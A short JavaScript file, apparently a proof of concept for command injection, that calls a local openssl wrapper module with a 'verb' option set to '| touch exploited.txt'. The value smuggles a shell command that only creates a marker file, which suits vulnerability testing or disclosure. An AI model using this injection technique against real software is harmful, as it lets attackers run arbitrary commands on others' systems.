const openssl = require('../src');

const opts = { 
    verb: "| touch exploited.txt", 
    flags: "", 
    tail: "" 
};

openssl(opts);

